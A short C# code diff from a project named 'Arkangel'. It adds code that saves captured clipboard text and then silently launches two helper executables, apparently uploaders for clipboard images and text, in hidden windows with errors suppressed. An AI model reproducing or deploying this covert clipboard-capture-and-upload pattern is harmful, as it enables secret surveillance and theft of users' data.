@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Data.SQLite;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -53,6 +54,24 @@ namespace Arkangel
             DateTime mydate = DateTime.Now;
             string date = mydate.ToString("yyyy_MM_dd");
             File.WriteAllText(@"..\\..\\Clipboard\\"+date+"-"+email+"-"+token+".txt", _text.Text);
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upClipboardImg.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upClipboardText.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
         }
 
         private void bt_change_Click(object sender, RoutedEventArgs e)
